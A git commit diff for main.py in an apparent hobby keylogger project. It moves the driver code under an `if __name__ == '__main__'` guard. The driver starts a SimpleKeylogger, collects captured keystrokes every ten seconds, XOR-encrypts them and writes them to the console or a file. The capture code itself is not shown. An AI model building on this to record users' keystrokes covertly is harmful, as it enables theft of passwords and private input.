de2dff235ac1056e93c1fda12b8467fe6a3ded0c
Pinni Plevinski <shareytora007@gmail.com>
2025-02-12 12:45:47 +0200

    added if __name__ to main

--- main.py
+++ main.py
@@ -6,23 +6,24 @@ from keylogger.keyloggers import SimpleKeylogger
 from keylogger.logwriters import ConsoleLogWriter
 from keylogger.logwriters import FileLogWriter
 
-keylogger = SimpleKeylogger()
-log_writer = ConsoleLogWriter()
-# log_writer = FileLogWriter("logfile")
-encryptor = XorEncryption()
-seconds_to_sleep = 10
+if __name__ == '__main__':
+    keylogger = SimpleKeylogger()
+    log_writer = ConsoleLogWriter()
+    # log_writer = FileLogWriter("logfile")
+    encryptor = XorEncryption()
+    seconds_to_sleep = 10
 
-# Start the keylogger
-keylogger.start()
+    # Start the keylogger
+    keylogger.start()
 
-try:
-    while keylogger.running:
-        time.sleep(seconds_to_sleep)  # Send logs every 10 seconds
-        logs = keylogger.get_log()
-        if logs:
-            encrypted_logs = encryptor.encrypt(logs)
-            log_writer.write_log(logs)
-            log_writer.write_log(encrypted_logs)
-except KeyboardInterrupt:
-    keylogger.stop()
-    print("Keylogger stopped.")
+    try:
+        while keylogger.running:
+            time.sleep(seconds_to_sleep)  # Send logs every 10 seconds
+            logs = keylogger.get_log()
+            if logs:
+                encrypted_logs = encryptor.encrypt(logs)
+                log_writer.write_log(logs)
+                log_writer.write_log(encrypted_logs)
+    except KeyboardInterrupt:
+        keylogger.stop()
+        print("Keylogger stopped.")
